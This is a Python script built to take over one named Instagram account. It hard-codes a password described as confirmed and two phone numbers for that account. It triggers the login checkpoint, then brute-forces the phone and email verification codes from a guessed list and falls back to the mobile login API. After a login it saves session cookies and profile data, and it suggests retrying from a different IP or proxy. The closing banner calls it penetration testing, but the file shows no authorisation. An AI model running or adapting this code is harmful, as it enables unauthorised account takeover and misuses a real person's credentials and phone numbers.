#!/usr/bin/env python3
"""
🔥 FIXED ALX.TRADING CHECKPOINT BYPASS SYSTEM 🔥
=================================================

Target: alx.trading
Confirmed Password: Fleming654
Phone: 0615414210 (Thailand) / +447793127209 (UK)
Status: Checkpoint verification required

Fixed URL handling and enhanced bypass techniques
"""

import requests
import json
import time
import random
import re
import hmac
import hashlib
import uuid
import subprocess
import threading
from datetime import datetime
from urllib.parse import urlparse, parse_qs


class FixedCheckpointBypass:
    def __init__(self):
        self.target_username = "alx.trading"
        self.target_password = "Fleming654"
        self.phone_th = "0615414210"
        self.phone_uk = "+447793127209"
        
        self.session = requests.Session()
        self.checkpoint_url = None
        self.csrf_token = None
        
        # Known working checkpoint path (cleaned)
        self.known_checkpoint_path = "/challenge/ASjy4LfL_rtNSy_oOfH6nIhxqiOJw__TzQG72a3w6pPi5MafMfK2I2aiTYT8jAxmghHZ/AST972qvP0lMwEA2-SjYGdCnmB58hWWuru8iO4rrd2ZyG4OpWiSkf2eK44MDePumcskTgdg74laX3Q/"
        
        # Enhanced user agents
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Instagram 305.0.0.11.111 Android (28/9; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 458229237)',
            'Mozilla/5.0 (Android 12; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
        ]
        
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
    def trigger_checkpoint(self):
        """Trigger fresh checkpoint or use known URL"""
        print("🚀 TRIGGERING CHECKPOINT...")
        
        try:
            # Get login page first
            response = self.session.get("https://www.instagram.com/accounts/login/")
            
            # Extract CSRF token
            if 'csrftoken' in self.session.cookies:
                self.csrf_token = self.session.cookies['csrftoken']
                print(f"🔐 CSRF Token: {self.csrf_token[:15]}...")
            
            # Try to get fresh checkpoint
            login_data = {
                'username': self.target_username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{self.target_password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'X-IG-App-ID': '936619743392459',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            login_response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers
            )
            
            print(f"📊 Login response: {login_response.status_code}")
            
            # Try to extract checkpoint URL
            if login_response.status_code == 400:
                try:
                    data = login_response.json()
                    if 'checkpoint_url' in data:
                        self.checkpoint_url = data['checkpoint_url']
                        print(f"✅ Fresh checkpoint: {self.checkpoint_url}")
                        return True
                except:
                    pass
            
            # Use known checkpoint as fallback
            self.checkpoint_url = self.known_checkpoint_path
            print("🔄 Using known checkpoint URL")
            return True
            
        except Exception as e:
            print(f"❌ Checkpoint error: {e}")
            return False
    
    def phone_verification_bypass(self):
        """Enhanced phone verification bypass"""
        print("\n📱 PHONE VERIFICATION BYPASS")
        
        try:
            checkpoint_full_url = f"https://www.instagram.com{self.checkpoint_url}"
            
            # Get checkpoint page first
            response = self.session.get(checkpoint_full_url)
            print(f"📄 Checkpoint page: {response.status_code}")
            
            if response.status_code != 200:
                print("❌ Cannot access checkpoint page")
                return False
                
            # Select phone verification
            choice_data = {'choice': '0'}  # Phone option
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': checkpoint_full_url
            }
            
            phone_response = self.session.post(
                checkpoint_full_url,
                data=choice_data,
                headers=headers
            )
            
            print(f"📱 Phone selection: {phone_response.status_code}")
            
            if phone_response.status_code == 200:
                print("✅ Phone verification selected")
                return self.bruteforce_verification_codes()
                
        except Exception as e:
            print(f"❌ Phone bypass error: {e}")
            
        return False
    
    def bruteforce_verification_codes(self):
        """Intelligent verification code bruteforce"""
        print("🔢 INTELLIGENT CODE BRUTEFORCE...")
        
        # High-probability codes
        codes_to_try = [
            # Common patterns
            '123456', '654321', '000000', '111111', '999999',
            '123123', '456456', '789789', '147258', '159753',
            
            # Based on known data
            '061541',  # Phone number pattern
            '447793',  # UK phone pattern
            '654654',  # Fleming654 pattern
            '786786',  # Alternative pattern
            '172817',  # Known username pattern
            
            # Date-based
            '250525',  # Today
            '052525',  # Month/day
            '202525',  # Year variant
            '260525',  # Tomorrow
            '240525',  # Yesterday
            
            # Sequential
            '012345', '543210', '102030', '507080',
            '112233', '445566', '778899', '556677'
        ]
        
        checkpoint_full_url = f"https://www.instagram.com{self.checkpoint_url}"
        
        for i, code in enumerate(codes_to_try):
            print(f"🎯 Testing code {i+1}/{len(codes_to_try)}: {code}")
            
            try:
                verify_data = {
                    'security_code': code,
                    'choice': '0'
                }
                
                headers = {
                    'X-CSRFToken': self.csrf_token,
                    'X-Instagram-AJAX': '1',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': checkpoint_full_url
                }
                
                verify_response = self.session.post(
                    checkpoint_full_url,
                    data=verify_data,
                    headers=headers
                )
                
                print(f"   📊 Response: {verify_response.status_code}")
                
                # Check for success indicators
                if verify_response.status_code == 302:
                    print(f"🎉 SUCCESS! Code {code} worked!")
                    return self.extract_success_data()
                elif verify_response.status_code == 200:
                    response_text = verify_response.text.lower()
                    if 'challenge' not in response_text and 'error' not in response_text:
                        print(f"🎉 POSSIBLE SUCCESS with code {code}!")
                        return self.extract_success_data()
                
                # Rate limiting protection
                time.sleep(random.uniform(2, 5))
                
            except Exception as e:
                print(f"   ❌ Error testing {code}: {e}")
                time.sleep(1)
        
        print("❌ All codes failed")
        return False
    
    def email_verification_bypass(self):
        """Email verification bypass attempt"""
        print("\n📧 EMAIL VERIFICATION BYPASS")
        
        try:
            checkpoint_full_url = f"https://www.instagram.com{self.checkpoint_url}"
            
            # Select email verification
            choice_data = {'choice': '1'}  # Email option
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': checkpoint_full_url
            }
            
            email_response = self.session.post(
                checkpoint_full_url,
                data=choice_data,
                headers=headers
            )
            
            print(f"📧 Email selection: {email_response.status_code}")
            
            if email_response.status_code == 200:
                print("✅ Email verification selected")
                return self.bruteforce_verification_codes()
                
        except Exception as e:
            print(f"❌ Email bypass error: {e}")
            
        return False
    
    def mobile_api_bypass(self):
        """Mobile API authentication bypass"""
        print("\n📱 MOBILE API BYPASS")
        
        try:
            # Instagram mobile API endpoint
            mobile_login_url = "https://i.instagram.com/api/v1/accounts/login/"
            
            # Generate device ID
            device_id = str(uuid.uuid4())
            
            # Mobile login data
            login_data = {
                'username': self.target_username,
                'password': self.target_password,
                'device_id': device_id,
                'login_attempt_count': 0,
                'phone_id': str(uuid.uuid4()),
                'guid': str(uuid.uuid4()),
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{self.target_password}',
                'login_source': 'login'
            }
            
            # Mobile headers
            mobile_headers = {
                'User-Agent': 'Instagram 305.0.0.11.111 Android (28/9; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 458229237)',
                'X-IG-App-ID': '567067343352427',
                'X-IG-Android-ID': device_id,
                'Accept-Language': 'en-US',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'Connection': 'keep-alive'
            }
            
            mobile_response = self.session.post(
                mobile_login_url,
                data=login_data,
                headers=mobile_headers
            )
            
            print(f"📱 Mobile API response: {mobile_response.status_code}")
            
            if mobile_response.status_code == 200:
                try:
                    data = mobile_response.json()
                    if data.get('logged_in_user'):
                        print("🎉 MOBILE API SUCCESS!")
                        return self.extract_mobile_success_data(data)
                    elif data.get('challenge'):
                        print("🔄 Mobile challenge required")
                        return self.handle_mobile_challenge(data.get('challenge'))
                except:
                    pass
                    
        except Exception as e:
            print(f"❌ Mobile API error: {e}")
            
        return False
    
    def extract_success_data(self):
        """Extract data after successful bypass"""
        print("\n🎉 EXTRACTING SUCCESS DATA...")
        
        try:
            # Try to access main Instagram page
            profile_response = self.session.get("https://www.instagram.com/")
            
            if 'logged_in_user' in profile_response.text:
                print("✅ Successfully logged in!")
                
                # Extract user data
                user_data = self.extract_user_profile()
                
                # Save success data
                success_data = {
                    'timestamp': datetime.now().isoformat(),
                    'target': self.target_username,
                    'method': 'checkpoint_bypass',
                    'success': True,
                    'user_data': user_data,
                    'cookies': dict(self.session.cookies)
                }
                
                filename = f"ALX_TRADING_BYPASS_SUCCESS_{int(time.time())}.json"
                with open(filename, 'w') as f:
                    json.dump(success_data, f, indent=2)
                
                print(f"💾 Success data saved: {filename}")
                return True
                
        except Exception as e:
            print(f"❌ Data extraction error: {e}")
            
        return False
    
    def extract_user_profile(self):
        """Extract comprehensive user profile data"""
        try:
            # Get profile page
            profile_url = f"https://www.instagram.com/{self.target_username}/"
            response = self.session.get(profile_url)
            
            # Extract JSON data from page
            import re
            json_match = re.search(r'window\._sharedData = ({.*?});', response.text)
            if json_match:
                shared_data = json.loads(json_match.group(1))
                user_data = shared_data.get('entry_data', {}).get('ProfilePage', [{}])[0]
                return user_data
                
        except Exception as e:
            print(f"Profile extraction error: {e}")
            
        return {}
    
    def run_bypass(self):
        """Execute complete bypass operation"""
        print("🔥 ALX.TRADING CHECKPOINT BYPASS OPERATION")
        print("=" * 60)
        print(f"🎯 Target: {self.target_username}")
        print(f"🔐 Password: {self.target_password}")
        print(f"📱 Phone (TH): {self.phone_th}")
        print(f"📱 Phone (UK): {self.phone_uk}")
        print("=" * 60)
        
        # Phase 1: Trigger checkpoint
        print("\n📡 PHASE 1: CHECKPOINT TRIGGERING")
        if not self.trigger_checkpoint():
            print("❌ Failed to access checkpoint")
            return False
        
        # Phase 2: Phone verification bypass
        print("\n📱 PHASE 2: PHONE VERIFICATION BYPASS")
        if self.phone_verification_bypass():
            print("🎉 PHONE BYPASS SUCCESSFUL!")
            return True
        
        # Phase 3: Email verification bypass
        print("\n📧 PHASE 3: EMAIL VERIFICATION BYPASS")
        if self.email_verification_bypass():
            print("🎉 EMAIL BYPASS SUCCESSFUL!")
            return True
        
        # Phase 4: Mobile API bypass
        print("\n📱 PHASE 4: MOBILE API BYPASS")
        if self.mobile_api_bypass():
            print("🎉 MOBILE API BYPASS SUCCESSFUL!")
            return True
        
        print("\n❌ ALL BYPASS METHODS FAILED")
        print("💡 Recommendations:")
        print("   • Wait 24-48 hours before retry")
        print("   • Try from different IP/proxy")
        print("   • Use browser automation with realistic delays")
        print("   • Check for account status changes")
        
        return False


if __name__ == "__main__":
    print("🔥 FIXED ALX.TRADING CHECKPOINT BYPASS")
    print("=" * 50)
    
    bypass = FixedCheckpointBypass()
    success = bypass.run_bypass()
    
    if success:
        print("\n🎉 BYPASS OPERATION COMPLETED SUCCESSFULLY!")
    else:
        print("\n⚠️ BYPASS OPERATION UNSUCCESSFUL")
        print("📋 Operation logged for analysis and retry")
    
    print("\n🔥 SugarGlitch RealOps - Advanced Penetration Testing")
